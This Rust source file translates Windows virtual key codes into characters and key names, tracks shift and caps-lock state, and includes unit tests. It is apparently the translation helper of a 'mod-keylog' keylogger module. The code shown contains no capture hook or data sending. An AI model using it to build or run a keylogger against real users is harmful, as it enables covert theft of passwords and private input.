//! Virtual key code to character translation for mod-keylog
//!
//! Translates Windows virtual key codes to printable characters,
//! handling keyboard layouts, shift state, and special keys.

/// Result of translating a virtual key code
#[derive(Debug, Clone)]
pub enum KeyTranslation {
    /// A printable character
    Char(char),
    /// A special key that should be represented as [KEY_NAME]
    Special(String),
    /// Key should be ignored (modifier keys, etc.)
    Ignore,
}

/// Virtual key codes for special keys
#[cfg(target_os = "windows")]
pub mod vk {
    pub const VK_BACK: u8 = 0x08;
    pub const VK_TAB: u8 = 0x09;
    pub const VK_RETURN: u8 = 0x0D;
    pub const VK_SHIFT: u8 = 0x10;
    pub const VK_CONTROL: u8 = 0x11;
    pub const VK_MENU: u8 = 0x12; // Alt
    pub const VK_PAUSE: u8 = 0x13;
    pub const VK_CAPITAL: u8 = 0x14; // Caps Lock
    pub const VK_ESCAPE: u8 = 0x1B;
    pub const VK_SPACE: u8 = 0x20;
    pub const VK_PRIOR: u8 = 0x21; // Page Up
    pub const VK_NEXT: u8 = 0x22;  // Page Down
    pub const VK_END: u8 = 0x23;
    pub const VK_HOME: u8 = 0x24;
    pub const VK_LEFT: u8 = 0x25;
    pub const VK_UP: u8 = 0x26;
    pub const VK_RIGHT: u8 = 0x27;
    pub const VK_DOWN: u8 = 0x28;
    pub const VK_SNAPSHOT: u8 = 0x2C; // Print Screen
    pub const VK_INSERT: u8 = 0x2D;
    pub const VK_DELETE: u8 = 0x2E;
    pub const VK_LWIN: u8 = 0x5B;
    pub const VK_RWIN: u8 = 0x5C;
    pub const VK_NUMPAD0: u8 = 0x60;
    pub const VK_NUMPAD9: u8 = 0x69;
    pub const VK_MULTIPLY: u8 = 0x6A;
    pub const VK_ADD: u8 = 0x6B;
    pub const VK_SUBTRACT: u8 = 0x6D;
    pub const VK_DECIMAL: u8 = 0x6E;
    pub const VK_DIVIDE: u8 = 0x6F;
    pub const VK_F1: u8 = 0x70;
    pub const VK_F12: u8 = 0x7B;
    pub const VK_NUMLOCK: u8 = 0x90;
    pub const VK_SCROLL: u8 = 0x91;
    pub const VK_LSHIFT: u8 = 0xA0;
    pub const VK_RSHIFT: u8 = 0xA1;
    pub const VK_LCONTROL: u8 = 0xA2;
    pub const VK_RCONTROL: u8 = 0xA3;
    pub const VK_LMENU: u8 = 0xA4;
    pub const VK_RMENU: u8 = 0xA5;
    pub const VK_OEM_1: u8 = 0xBA;     // ;:
    pub const VK_OEM_PLUS: u8 = 0xBB;  // =+
    pub const VK_OEM_COMMA: u8 = 0xBC; // ,<
    pub const VK_OEM_MINUS: u8 = 0xBD; // -_
    pub const VK_OEM_PERIOD: u8 = 0xBE; // .>
    pub const VK_OEM_2: u8 = 0xBF;     // /?
    pub const VK_OEM_3: u8 = 0xC0;     // `~
    pub const VK_OEM_4: u8 = 0xDB;     // [{
    pub const VK_OEM_5: u8 = 0xDC;     // \|
    pub const VK_OEM_6: u8 = 0xDD;     // ]}
    pub const VK_OEM_7: u8 = 0xDE;     // '"
}

/// Translate a virtual key code to a character or special key representation
#[cfg(target_os = "windows")]
pub fn translate_vk(vk_code: u8, shift: bool, caps_lock: bool) -> KeyTranslation {
    use vk::*;

    match vk_code {
        // Modifier keys - ignore
        VK_SHIFT | VK_CONTROL | VK_MENU | VK_LSHIFT | VK_RSHIFT | VK_LCONTROL
        | VK_RCONTROL | VK_LMENU | VK_RMENU | VK_LWIN | VK_RWIN | VK_CAPITAL
        | VK_NUMLOCK | VK_SCROLL => KeyTranslation::Ignore,

        // Special keys
        VK_BACK => KeyTranslation::Special("BACKSPACE".into()),
        VK_TAB => KeyTranslation::Special("TAB".into()),
        VK_RETURN => KeyTranslation::Special("ENTER".into()),
        VK_ESCAPE => KeyTranslation::Special("ESC".into()),
        VK_SPACE => KeyTranslation::Char(' '),
        VK_PRIOR => KeyTranslation::Special("PGUP".into()),
        VK_NEXT => KeyTranslation::Special("PGDN".into()),
        VK_END => KeyTranslation::Special("END".into()),
        VK_HOME => KeyTranslation::Special("HOME".into()),
        VK_LEFT => KeyTranslation::Special("LEFT".into()),
        VK_UP => KeyTranslation::Special("UP".into()),
        VK_RIGHT => KeyTranslation::Special("RIGHT".into()),
        VK_DOWN => KeyTranslation::Special("DOWN".into()),
        VK_SNAPSHOT => KeyTranslation::Special("PRTSC".into()),
        VK_INSERT => KeyTranslation::Special("INS".into()),
        VK_DELETE => KeyTranslation::Special("DEL".into()),
        VK_PAUSE => KeyTranslation::Special("PAUSE".into()),

        // Function keys
        vk if (VK_F1..=VK_F12).contains(&vk) => {
            KeyTranslation::Special(format!("F{}", vk - VK_F1 + 1))
        }

        // Numbers 0-9
        vk @ 0x30..=0x39 => {
            let base = (vk - 0x30) as char;
            if shift {
                let shifted = match vk {
                    0x30 => ')',
                    0x31 => '!',
                    0x32 => '@',
                    0x33 => '#',
                    0x34 => '$',
                    0x35 => '%',
                    0x36 => '^',
                    0x37 => '&',
                    0x38 => '*',
                    0x39 => '(',
                    _ => base,
                };
                KeyTranslation::Char(shifted)
            } else {
                KeyTranslation::Char((b'0' + (vk - 0x30)) as char)
            }
        }

        // Letters A-Z
        vk @ 0x41..=0x5A => {
            let base = (vk - 0x41 + b'a') as char;
            let upper = shift ^ caps_lock;
            if upper {
                KeyTranslation::Char(base.to_ascii_uppercase())
            } else {
                KeyTranslation::Char(base)
            }
        }

        // Numpad
        vk @ VK_NUMPAD0..=VK_NUMPAD9 => {
            KeyTranslation::Char((b'0' + (vk - VK_NUMPAD0)) as char)
        }
        VK_MULTIPLY => KeyTranslation::Char('*'),
        VK_ADD => KeyTranslation::Char('+'),
        VK_SUBTRACT => KeyTranslation::Char('-'),
        VK_DECIMAL => KeyTranslation::Char('.'),
        VK_DIVIDE => KeyTranslation::Char('/'),

        // OEM keys (US keyboard layout)
        VK_OEM_1 => KeyTranslation::Char(if shift { ':' } else { ';' }),
        VK_OEM_PLUS => KeyTranslation::Char(if shift { '+' } else { '=' }),
        VK_OEM_COMMA => KeyTranslation::Char(if shift { '<' } else { ',' }),
        VK_OEM_MINUS => KeyTranslation::Char(if shift { '_' } else { '-' }),
        VK_OEM_PERIOD => KeyTranslation::Char(if shift { '>' } else { '.' }),
        VK_OEM_2 => KeyTranslation::Char(if shift { '?' } else { '/' }),
        VK_OEM_3 => KeyTranslation::Char(if shift { '~' } else { '`' }),
        VK_OEM_4 => KeyTranslation::Char(if shift { '{' } else { '[' }),
        VK_OEM_5 => KeyTranslation::Char(if shift { '|' } else { '\\' }),
        VK_OEM_6 => KeyTranslation::Char(if shift { '}' } else { ']' }),
        VK_OEM_7 => KeyTranslation::Char(if shift { '"' } else { '\'' }),

        // Unknown key
        _ => KeyTranslation::Ignore,
    }
}

/// Non-Windows stub
#[cfg(not(target_os = "windows"))]
pub fn translate_vk(_vk_code: u8, _shift: bool, _caps_lock: bool) -> KeyTranslation {
    KeyTranslation::Ignore
}

/// Check if a key is currently pressed using GetAsyncKeyState
#[cfg(target_os = "windows")]
pub fn is_key_pressed(vk_code: i32) -> bool {
    use windows_sys::Win32::UI::Input::KeyboardAndMouse::GetAsyncKeyState;
    unsafe { (GetAsyncKeyState(vk_code) & 0x8000u16 as i16) != 0 }
}

#[cfg(not(target_os = "windows"))]
pub fn is_key_pressed(_vk_code: i32) -> bool {
    false
}

/// Check if shift is currently held
#[cfg(target_os = "windows")]
pub fn is_shift_pressed() -> bool {
    is_key_pressed(vk::VK_SHIFT as i32)
        || is_key_pressed(vk::VK_LSHIFT as i32)
        || is_key_pressed(vk::VK_RSHIFT as i32)
}

#[cfg(not(target_os = "windows"))]
pub fn is_shift_pressed() -> bool {
    false
}

/// Check if caps lock is active
#[cfg(target_os = "windows")]
pub fn is_caps_lock_on() -> bool {
    use windows_sys::Win32::UI::Input::KeyboardAndMouse::GetKeyState;
    unsafe { (GetKeyState(vk::VK_CAPITAL as i32) & 1) != 0 }
}

#[cfg(not(target_os = "windows"))]
pub fn is_caps_lock_on() -> bool {
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[cfg(target_os = "windows")]
    fn test_letter_translation() {
        // Lowercase
        match translate_vk(0x41, false, false) {
            KeyTranslation::Char(c) => assert_eq!(c, 'a'),
            _ => panic!("Expected Char"),
        }

        // Uppercase with shift
        match translate_vk(0x41, true, false) {
            KeyTranslation::Char(c) => assert_eq!(c, 'A'),
            _ => panic!("Expected Char"),
        }

        // Uppercase with caps lock
        match translate_vk(0x41, false, true) {
            KeyTranslation::Char(c) => assert_eq!(c, 'A'),
            _ => panic!("Expected Char"),
        }

        // Lowercase with both (cancel out)
        match translate_vk(0x41, true, true) {
            KeyTranslation::Char(c) => assert_eq!(c, 'a'),
            _ => panic!("Expected Char"),
        }
    }

    #[test]
    #[cfg(target_os = "windows")]
    fn test_number_translation() {
        match translate_vk(0x31, false, false) {
            KeyTranslation::Char(c) => assert_eq!(c, '1'),
            _ => panic!("Expected Char"),
        }

        match translate_vk(0x31, true, false) {
            KeyTranslation::Char(c) => assert_eq!(c, '!'),
            _ => panic!("Expected Char"),
        }
    }

    #[test]
    #[cfg(target_os = "windows")]
    fn test_special_keys() {
        match translate_vk(0x0D, false, false) {
            KeyTranslation::Special(s) => assert_eq!(s, "ENTER"),
            _ => panic!("Expected Special"),
        }

        match translate_vk(0x08, false, false) {
            KeyTranslation::Special(s) => assert_eq!(s, "BACKSPACE"),
            _ => panic!("Expected Special"),
        }
    }

    #[test]
    fn test_modifier_ignored() {
        // On non-Windows, all keys return Ignore which is expected
        match translate_vk(0x10, false, false) {
            KeyTranslation::Ignore => {}
            _ => {
                #[cfg(not(target_os = "windows"))]
                panic!("Expected Ignore on non-Windows");
            }
        }
    }

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn test_non_windows_returns_ignore() {
        // On non-Windows platforms, translate_vk always returns Ignore
        match translate_vk(0x41, false, false) {
            KeyTranslation::Ignore => {}
            _ => panic!("Expected Ignore on non-Windows"),
        }
    }
}
